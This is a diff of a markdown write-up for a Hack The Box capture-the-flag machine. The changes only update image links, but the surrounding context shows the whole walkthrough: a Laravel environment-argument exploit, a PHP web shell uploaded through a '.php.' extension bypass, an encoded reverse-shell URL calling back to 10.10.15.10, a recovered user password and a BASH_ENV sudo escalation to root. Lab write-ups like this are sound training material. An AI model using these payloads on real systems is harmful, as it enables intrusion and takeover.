@@ -25,7 +25,7 @@ echo '10.10.11.67 environment.htb' | sudo tee -a /etc/hosts
 
 Now we can go to the web application:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611154300.png)
+![](Pasted image 20250611154300.png)
 
 Let's fuzz:
 
@@ -101,7 +101,7 @@ ________________________________________________
 
 No vhosts, well, let's proceed, once we go to `/upload`, we find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611155249.png)
+![](Pasted image 20250611155249.png)
 
 As expected from the ffuf scan, this requires a POST request, also, we can see this is running:
 
@@ -111,30 +111,30 @@ php 8.2.28 - Laravel 11.30.0
 
 If we search for an exploit regarding this version, we find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611155805.png)
+![](Pasted image 20250611155805.png)
 
 For this to work, we need to check if there's a pre-production environment, if we go to `/login`, we can see this:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611155846.png)
+![](Pasted image 20250611155846.png)
 
 As seen, we can login with a `Remember me` option, if we submit the request to a proxy, this happens:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611155958.png)
+![](Pasted image 20250611155958.png)
 
 At first sight, the request seems normal, pretty straightforward request saying we got invalid credentials, but this happens once we erase a parameter such as the password:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160101.png)
+![](Pasted image 20250611160101.png)
 
 Request is now bigger and we can find this if we explore it:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160147.png)
+![](Pasted image 20250611160147.png)
 
 As seen some code is being leaked, let's try setting the `Remember` parameter to something different from `True` or `False`:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160253.png)
+![](Pasted image 20250611160253.png)
 
 This code snippet let us see the existence of the production environment:
 
@@ -150,12 +150,12 @@ Which gives us access on `/management/dashboard`, we can chain it with that CVE 
 
 First of all, let's search an exploit for the CVE:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160430.png)
+![](Pasted image 20250611160430.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160651.png)
+![](Pasted image 20250611160651.png)
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160715.png)
+![](Pasted image 20250611160715.png)
 
 So, in order to get access to the dashboard, we need to do a post request on:
 
@@ -164,20 +164,20 @@ http://environment.htb/login?--env=prepod
 ```
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160938.png)
+![](Pasted image 20250611160938.png)
 
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160948.png)
+![](Pasted image 20250611160948.png)
 
 Nice, the exploit works, let's go into the dashboard:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611161045.png)
+![](Pasted image 20250611161045.png)
 
 
 We got a dashboard and our profile, we can see a bunch of users that are subscribed to the mail listing on here, there are two of them unsubscribed, if we check our profile, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611161133.png)
+![](Pasted image 20250611161133.png)
 
 As seen, we can upload images for our profile picture, the correct approach would be testing for a file upload vulnerability, let's try to embed a php web shell on an image:
 
@@ -200,11 +200,11 @@ mv image.jpg webshell.php
 
 If we try uploading the file with a `.php` extension it doesn't work, but, we can try `.php.`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611163855.png)
+![](Pasted image 20250611163855.png)
 
 As seen, it works and give us the location of the webshell, if we try it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611163916.png)
+![](Pasted image 20250611163916.png)
 
 We got RCE, nice, let's get a reverse shell:
 
@@ -212,7 +212,7 @@ We got RCE, nice, let's get a reverse shell:
 http://environment.htb/storage/files/webshell.php?cmd=php+-r+%27%24sock%3dfsockopen%28%2210.10.15.10%22%2C1111%29%3bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3b%27
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611164331.png)
+![](Pasted image 20250611164331.png)
 
 We got our shell, let's begin privilege escalation.
 
@@ -233,7 +233,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611164428.png)
+![](Pasted image 20250611164428.png)
 
 Inside of `hish` home directory, we can find this:
 
@@ -291,7 +291,7 @@ There we go, we got the password for hish:
 hish:marineSPm@ster!!
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611170307.png)
+![](Pasted image 20250611170307.png)
 
 Now, let's check our sudo privileges:
 
@@ -331,7 +331,7 @@ Now, we need to set the `BASH_ENV` and run sudo:
 sudo ENV=/tmp/rootshell.sh BASH_ENV=/tmp/rootshell.sh /usr/bin/systeminfo
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611170836.png)
+![](Pasted image 20250611170836.png)
 
 There we go, we got a root shell, let's get both flags and end the CTF:
 
@@ -343,7 +343,7 @@ root@environment:/home/hish# cat /root/root.txt
 3e7980c4bd6234998b50c3b3e6d1ac41
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611170934.png)
+![](Pasted image 20250611170934.png)
 
 https://www.hackthebox.com/achievement/machine/1872557/659
 
